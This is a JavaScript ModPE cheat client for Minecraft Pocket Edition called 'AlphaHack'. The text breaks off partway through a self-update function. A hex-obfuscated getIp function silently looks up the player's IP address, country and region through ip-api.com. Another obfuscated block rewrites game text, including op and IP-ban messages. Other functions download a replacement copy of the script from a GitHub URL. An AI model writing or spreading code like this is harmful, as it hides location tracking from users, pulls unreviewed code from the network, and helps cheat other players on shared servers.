var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();

/*
*     AlphaHack! version: stable 0.6.0
*
*     Authors: Arceus_matt, godsoft029.
*
*     Started: MCPE v0.12.0
*
*     Open src?: Do not copy! ask permission.
*
*     Coding langs: HTML, js, java, php, python.
*
*     desc: Half illegal half MCPE tool, used for
*     multi player use & single player modding.
*
*     Creator: Arceus_matt.
*
*     Always get my revenge. =) enjoy!
*/

var bg64 = "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";

var Button = android.widget.Button;
var LinearLayout = android.widget.LinearLayout;
var RelativeLayout = android.widget.RelativeLayout;
var PopupWindow = android.widget.PopupWindow;
var ScrollView = android.widget.ScrollView;
var TextView = android.widget.TextView;
var CheckBox = android.widget.CheckBox;
var Toast = android.widget.Toast;
var Runnable = java.lang.Runnable;
var View = android.view.View;
var ColorDrawable = android.graphics.drawable.ColorDrawable;
var Color = android.graphics.Color;
var Gravity = android.view.Gravity;
var Intent = android.content.Intent;
var Uri = android.net.Uri;
var GUI;
var menu;
var exitUI;

var _0x567c=["\x68\x74\x74\x70\x3A\x2F\x2F\x69\x70\x2D\x61\x70\x69\x2E\x63\x6F\x6D\x2F\x6A\x73\x6F\x6E","\x6E\x65\x74","\x6F\x70\x65\x6E\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x47\x45\x54","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x4D\x65\x74\x68\x6F\x64","\x73\x65\x74\x44\x6F\x4F\x75\x74\x70\x75\x74","\x63\x6F\x6E\x6E\x65\x63\x74","\x67\x65\x74\x43\x6F\x6E\x74\x65\x6E\x74\x4C\x65\x6E\x67\x74\x68","\x67\x65\x74\x49\x6E\x70\x75\x74\x53\x74\x72\x65\x61\x6D","\x42\x79\x74\x65","\x6C\x61\x6E\x67","\x6E\x65\x77\x49\x6E\x73\x74\x61\x6E\x63\x65","\x41\x72\x72\x61\x79","\x72\x65\x66\x6C\x65\x63\x74","\x72\x65\x61\x64","","\x70\x61\x72\x73\x65","\x73\x75\x63\x63\x65\x73\x73","\x65\x71\x75\x61\x6C\x73","\x73\x74\x61\x74\x75\x73","\x71\x75\x65\x72\x79","\x63\x6F\x75\x6E\x74\x72\x79","\x72\x65\x67\x69\x6F\x6E\x4E\x61\x6D\x65","\x45\x72\x72\x6F\x72","\x6C\x69\x6E\x65\x4E\x75\x6D\x62\x65\x72","\x73\x74\x61\x72\x74"];function getIp(_0x9781x2){var _0x9781x3= new java[_0x567c[10]].Runnable({run:function(){try{var _0x9781x4= new java[_0x567c[1]].URL(_0x567c[0]);var _0x9781x5=_0x9781x4[_0x567c[2]]();_0x9781x5[_0x567c[4]](_0x567c[3]);_0x9781x5[_0x567c[5]](true);_0x9781x5[_0x567c[6]]();_0x9781x5[_0x567c[7]]();var _0x9781x6=_0x9781x5[_0x567c[8]]();var _0x9781x7=java[_0x567c[10]][_0x567c[13]][_0x567c[12]][_0x567c[11]](java[_0x567c[10]][_0x567c[9]].TYPE,1024);var _0x9781x8=0;var _0x9781x9;while((_0x9781x8=_0x9781x6[_0x567c[14]](_0x9781x7))!= -1){_0x9781x9= new java[_0x567c[10]].String(_0x9781x7,0,_0x9781x8)};var _0x9781xa=JSON[_0x567c[16]](_0x9781x9+_0x567c[15]);if(_0x9781xa[_0x567c[19]][_0x567c[18]](_0x567c[17])){_0x9781x2( new Array(_0x9781xa[_0x567c[20]],_0x9781xa[_0x567c[21]],_0x9781xa[_0x567c[22]]))}else {print(_0x567c[23]);_0x9781x2( new Array(_0x567c[23],_0x567c[23],_0x567c[23]))}}catch(e){clientMessage(e);clientMessage(e[_0x567c[24]])}}});var _0x9781xb= new java[_0x567c[10]].Thread(_0x9781x3);_0x9781xb[_0x567c[25]]()}

var _0x46fa=["\x6D\x65\x6E\x75\x2E\x63\x6F\x70\x79\x72\x69\x67\x68\x74","\x4D\x6F\x6A\x61\x6E\x67\x20\x26\x20\x41\x72\x63\x65\x75\x73\x5F\x6D\x61\x74\x74\x27\x73\x20\x41\x6C\x70\x68\x61\x48\x61\x63\x6B\x21","\x6C\x61\x6E\x67\x45\x64\x69\x74","\x6D\x65\x6E\x75\x2E\x70\x6C\x61\x79","\xA7\x33\x50\x6C\x61\x79","\x6D\x65\x6E\x75\x2E\x6F\x70\x74\x69\x6F\x6E\x73","\xA7\x33\x53\x65\x74\x74\x69\x6E\x67\x73","\x6D\x65\x6E\x75\x2E\x73\x6B\x69\x6E\x73","\xA7\x33\x53\x6B\x69\x6E\x73","\x70\x6C\x61\x79\x73\x63\x72\x65\x65\x6E\x2E\x68\x65\x61\x64\x65\x72\x2E\x6C\x6F\x63\x61\x6C","\xA7\x33\x53\x65\x6C\x65\x63\x74\x20\x77\x6F\x72\x6C\x64","\x73\x6B\x69\x6E\x73\x2E\x74\x69\x74\x6C\x65","\x6F\x70\x74\x69\x6F\x6E\x73\x2E\x74\x69\x74\x6C\x65","\x64\x65\x61\x74\x68\x53\x63\x72\x65\x65\x6E\x2E\x6D\x65\x73\x73\x61\x67\x65","\xA7\x63\xA7\x6C\x57\x61\x73\x74\x65\x64","\x70\x6C\x61\x79\x73\x63\x72\x65\x65\x6E\x2E\x6E\x65\x77","\xA7\x33\x4E\x65\x77","\x70\x6C\x61\x79\x73\x63\x72\x65\x65\x6E\x2E\x71\x75\x69\x74","\xA7\x33\x42\x61\x63\x6B","\x73\x6B\x69\x6E\x73\x2E\x72\x65\x73\x74\x6F\x72\x65\x2E\x62\x75\x74\x74\x6F\x6E","\xA7\x33\x52\x65\x73\x74\x6F\x72\x65","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x61\x64\x76\x61\x6E\x63\x65\x64","\xA7\x33\x41\x64\x76\x61\x6E\x63\x65\x64","\x65\x78\x74\x65\x72\x6E\x61\x6C\x53\x65\x72\x76\x65\x72\x53\x63\x72\x65\x65\x6E\x2E\x61\x64\x64\x53\x65\x72\x76\x65\x72","\xA7\x33\x41\x64\x64\x20\x53\x65\x72\x76\x65\x72","\x6D\x75\x6C\x74\x69\x70\x6C\x61\x79\x65\x72\x2E\x70\x6C\x61\x79\x65\x72\x2E\x6A\x6F\x69\x6E\x65\x64","\xA7\x33\x25\x73\x20\x6A\x6F\x69\x6E\x65\x64\x20\x74\x68\x65\x20\x67\x61\x6D\x65","\x6D\x75\x6C\x74\x69\x70\x6C\x61\x79\x65\x72\x2E\x70\x6C\x61\x79\x65\x72\x2E\x6C\x65\x66\x74","\xA7\x33\x25\x73\x20\x6C\x65\x66\x74\x20\x74\x68\x65\x20\x67\x61\x6D\x65","\x64\x65\x61\x74\x68\x53\x63\x72\x65\x65\x6E\x2E\x71\x75\x69\x74","\xA7\x33\x4D\x61\x69\x6E\x20\x4D\x65\x6E\x75","\x64\x65\x61\x74\x68\x53\x63\x72\x65\x65\x6E\x2E\x72\x65\x73\x70\x61\x77\x6E","\xA7\x33\x52\x65\x73\x70\x61\x77\x6E","\x70\x61\x75\x73\x65\x53\x63\x72\x65\x65\x6E\x2E\x71\x75\x69\x74","\x70\x61\x75\x73\x65\x53\x63\x72\x65\x65\x6E\x2E\x6F\x70\x74\x69\x6F\x6E\x73","\x70\x61\x75\x73\x65\x53\x63\x72\x65\x65\x6E\x2E\x62\x61\x63\x6B","\xA7\x33\x42\x61\x63\x6B\x20\x74\x6F\x20\x67\x61\x6D\x65","\x6D\x65\x6E\x75\x2E\x72\x65\x74\x75\x72\x6E\x54\x6F\x47\x61\x6D\x65","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x6D\x6F\x62","\xA7\x33\x25\x31\x24\x73\x20\x77\x61\x73\x20\x73\x6C\x61\x69\x6E\x20\x62\x79\x20\x25\x32\x24\x73","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x66\x61\x6C\x6C","\xA7\x33\x25\x31\x24\x73\x20\x68\x69\x74\x20\x74\x68\x65\x20\x67\x72\x6F\x75\x6E\x64\x20\x74\x6F\x6F\x20\x68\x61\x72\x64","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x65\x78\x70\x6C\x6F\x73\x69\x6F\x6E","\xA7\x33\x25\x31\x24\x73\x20\x62\x6C\x65\x77\x20\x75\x70","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x61\x72\x72\x6F\x77","\xA7\x33\x25\x31\x24\x73\x20\x77\x61\x73\x20\x73\x68\x6F\x74\x20\x62\x79\x20\x25\x32\x24\x73","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x64\x72\x6F\x77\x6E","\xA7\x33\x25\x31\x24\x73\x20\x64\x72\x6F\x77\x6E\x65\x64","\x64\x65\x61\x74\x68\x2E\x66\x65\x6C\x6C\x2E\x61\x63\x63\x69\x64\x65\x6E\x74\x2E\x67\x65\x6E\x65\x72\x69\x63","\xA7\x33\x25\x31\x24\x73\x20\x66\x65\x6C\x6C\x20\x66\x72\x6F\x6D\x20\x61\x20\x68\x69\x67\x68\x20\x70\x6C\x61\x63\x65","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x6F\x75\x74\x4F\x66\x57\x6F\x72\x6C\x64","\xA7\x33\x25\x31\x24\x73\x20\x66\x65\x6C\x6C\x20\x6F\x75\x74\x20\x6F\x66\x20\x74\x68\x65\x20\x77\x6F\x72\x6C\x64","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x6F\x6E\x46\x69\x72\x65","\xA7\x33\x25\x31\x24\x73\x20\x62\x75\x72\x6E\x65\x64\x20\x74\x6F\x20\x64\x65\x61\x74\x68","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x6D\x61\x67\x69\x63","\xA7\x33\x25\x31\x24\x73\x20\x77\x61\x73\x20\x6B\x69\x6C\x6C\x65\x64\x20\x62\x79\x20\x6D\x61\x67\x69\x63","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x69\x6E\x57\x61\x6C\x6C","\xA7\x33\x25\x31\x24\x73\x20\x73\x75\x66\x66\x6F\x63\x61\x74\x65\x64\x20\x69\x6E\x20\x61\x20\x77\x61\x6C\x6C","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x6C\x61\x76\x61","\xA7\x33\x25\x31\x24\x73\x20\x74\x72\x69\x65\x64\x20\x74\x6F\x20\x73\x77\x69\x6D\x20\x69\x6E\x20\x6C\x61\x76\x61","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x69\x6E\x46\x69\x72\x65","\xA7\x33\x25\x31\x24\x73\x20\x77\x65\x6E\x74\x20\x75\x70\x20\x69\x6E\x20\x66\x6C\x61\x6D\x65\x73","\x64\x65\x61\x74\x68\x2E\x61\x74\x74\x61\x63\x6B\x2E\x63\x61\x63\x74\x75\x73","\xA7\x33\x25\x31\x24\x73\x20\x77\x61\x73\x20\x70\x72\x69\x63\x6B\x65\x64\x20\x74\x6F\x20\x64\x65\x61\x74\x68","\x63\x6F\x6D\x6D\x61\x6E\x64\x73\x2E\x6F\x70\x2E\x73\x75\x63\x63\x65\x73\x73","\xA7\x6C\x4F\x70\x70\x65\x64\x20\x25\x73","\x63\x6F\x6D\x6D\x61\x6E\x64\x73\x2E\x62\x61\x6E\x69\x70\x2E\x73\x75\x63\x63\x65\x73\x73","\xA7\x72\x42\x61\x6E\x6E\x65\x64\x20\x49\x50\x20\x61\x64\x64\x72\x65\x73\x73\x20\xA7\x6C\x25\x73","\x63\x6F\x6D\x6D\x61\x6E\x64\x73\x2E\x62\x61\x6E\x69\x70\x2E\x73\x75\x63\x63\x65\x73\x73\x2E\x70\x6C\x61\x79\x65\x72\x73","\xA7\x72\x42\x61\x6E\x6E\x65\x64\x20\x49\x50\x20\x61\x64\x64\x72\x65\x73\x73\x20\xA7\x6C\x25\x73\x20\xA7\x72\x62\x65\x6C\x6F\x6E\x67\x69\x6E\x67\x20\x74\x6F\x20\x25\x73","\x63\x68\x61\x74\x53\x63\x72\x65\x65\x6E\x2E\x68\x69\x64\x65","\xA7\x33\x48\x69\x64\x65","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x61\x63\x74\x69\x6F\x6E\x2E\x6C\x6F\x63\x61\x6C","\xA7\x33\x43\x72\x65\x61\x74\x65\x20\x57\x6F\x72\x6C\x64\x21","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x67\x61\x6D\x65\x4D\x6F\x64\x65\x2E\x63\x72\x65\x61\x74\x69\x76\x65","\xA7\x33\x43\x72\x65\x61\x74\x69\x76\x65","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x67\x61\x6D\x65\x4D\x6F\x64\x65\x2E\x73\x75\x72\x76\x69\x76\x61\x6C","\xA7\x33\x53\x75\x72\x76\x69\x76\x61\x6C","\x63\x72\x65\x61\x74\x65\x57\x6F\x72\x6C\x64\x53\x63\x72\x65\x65\x6E\x2E\x64\x65\x6C\x65\x74\x65","\xA7\x33\x44\x65\x6C\x65\x74\x65"];ModPE[_0x46fa[2]](_0x46fa[0],_0x46fa[1]);ModPE[_0x46fa[2]](_0x46fa[3],_0x46fa[4]);ModPE[_0x46fa[2]](_0x46fa[5],_0x46fa[6]);ModPE[_0x46fa[2]](_0x46fa[7],_0x46fa[8]);ModPE[_0x46fa[2]](_0x46fa[9],_0x46fa[10]);ModPE[_0x46fa[2]](_0x46fa[11],_0x46fa[8]);ModPE[_0x46fa[2]](_0x46fa[12],_0x46fa[6]);ModPE[_0x46fa[2]](_0x46fa[13],_0x46fa[14]);ModPE[_0x46fa[2]](_0x46fa[15],_0x46fa[16]);ModPE[_0x46fa[2]](_0x46fa[17],_0x46fa[18]);ModPE[_0x46fa[2]](_0x46fa[19],_0x46fa[20]);ModPE[_0x46fa[2]](_0x46fa[21],_0x46fa[22]);ModPE[_0x46fa[2]](_0x46fa[23],_0x46fa[24]);ModPE[_0x46fa[2]](_0x46fa[25],_0x46fa[26]);ModPE[_0x46fa[2]](_0x46fa[27],_0x46fa[28]);ModPE[_0x46fa[2]](_0x46fa[29],_0x46fa[30]);ModPE[_0x46fa[2]](_0x46fa[31],_0x46fa[32]);ModPE[_0x46fa[2]](_0x46fa[33],_0x46fa[30]);ModPE[_0x46fa[2]](_0x46fa[34],_0x46fa[6]);ModPE[_0x46fa[2]](_0x46fa[35],_0x46fa[36]);ModPE[_0x46fa[2]](_0x46fa[37],_0x46fa[36]);ModPE[_0x46fa[2]](_0x46fa[38],_0x46fa[39]);ModPE[_0x46fa[2]](_0x46fa[40],_0x46fa[41]);ModPE[_0x46fa[2]](_0x46fa[42],_0x46fa[43]);ModPE[_0x46fa[2]](_0x46fa[44],_0x46fa[45]);ModPE[_0x46fa[2]](_0x46fa[46],_0x46fa[47]);ModPE[_0x46fa[2]](_0x46fa[48],_0x46fa[49]);ModPE[_0x46fa[2]](_0x46fa[50],_0x46fa[51]);ModPE[_0x46fa[2]](_0x46fa[52],_0x46fa[53]);ModPE[_0x46fa[2]](_0x46fa[54],_0x46fa[55]);ModPE[_0x46fa[2]](_0x46fa[56],_0x46fa[57]);ModPE[_0x46fa[2]](_0x46fa[58],_0x46fa[59]);ModPE[_0x46fa[2]](_0x46fa[60],_0x46fa[61]);ModPE[_0x46fa[2]](_0x46fa[62],_0x46fa[63]);ModPE[_0x46fa[2]](_0x46fa[64],_0x46fa[65]);ModPE[_0x46fa[2]](_0x46fa[66],_0x46fa[67]);ModPE[_0x46fa[2]](_0x46fa[68],_0x46fa[69]);ModPE[_0x46fa[2]](_0x46fa[70],_0x46fa[71]);ModPE[_0x46fa[2]](_0x46fa[72],_0x46fa[73]);ModPE[_0x46fa[2]](_0x46fa[74],_0x46fa[75]);ModPE[_0x46fa[2]](_0x46fa[76],_0x46fa[77]);ModPE[_0x46fa[2]](_0x46fa[78],_0x46fa[79])

var num0  = 0;
var version = "0.6.5";
var name = "Alphα Hαck";
var authers = "ArceusMatt";
var authers2 = "Godsoft029";
var copyright = "©";
var text = "";
var space = " ";
var client = "§f<§3AlphαHαck§f> ";
var hackcount = 0;
var fps = 0;
var lastLoop = new Date;
var modpeFolder = ctx.getDir("ModPE", 0);
var modpeFile = new java.io.File(modpeFolder, "ALPHAHack.js");
var can = 1;
var canGetHP = 1;
var HP;
var gravity = -0.07840000092983246;
var nameColor = "§7";
var healthColor = "§c";
var operm = "pocketmine.command";
var operm2 = "*";
var GetLang = net.zhuoweizhang.mcpelauncher.ScriptManager.nativeGetLanguageName();

function checkVersion() {
    var r  = new java.lang.Runnable() {
        run: function() {
            try {
 var urls= new java.net.URL("https://raw.githubusercontent.com/ArceusMatt/ALPHAHack/master/Version.txt");
                var check = urls.openConnection();
                check.setRequestMethod("GET");
                check.setDoOutput(true);
                check.connect();
                check.getContentLength();
                var script = check.getInputStream();
                var typeb = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 1024);
                var byteCount = 0; 
                var checkedVersion;
                while((byteCount = script.read(typeb)) != -1) { 
                    checkedVersion = new java.lang.String(typeb, 0, byteCount);               
                }
                newUpdate = checkedVersion;
                if(version+"\n" != checkedVersion) {
print("New update! " + newUpdate);
                    updateWindow=true;
                }
                else if(version+"\n"==checkedVersion){
                /*print("No update available");*/
                }
            }
            catch(err) {
                
                if(err=="JavaException: java.net.UnknownHostException: raw.githubusercontent.com") {
                                
                            }
                            else {
                                print("Error: " + err);
                            } 
            }
        }
    }
    var threadt = new java.lang.Thread(r);
    threadt.start();
}

function updateVersion() {
                var ru  = new java.lang.Runnable() {
                    run: function() {
                        try {
                            var urls = new java.net.URL("https://raw.githubusercontent.com/ArceusMatt/ALPHAHack/master/ALPHAHack.js");
                            var check = urls.openConnection();
                            check.setRequestMethod("GET");
                            check.setDoOutput(true);
                            check.connect();
                            check.getContentLength();
                            var script = check.getInputStream();
                            var typeb = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 1024);
                            var byteCount = 0;
                            while((byteCount = script.read(typeb)) != -1) { 
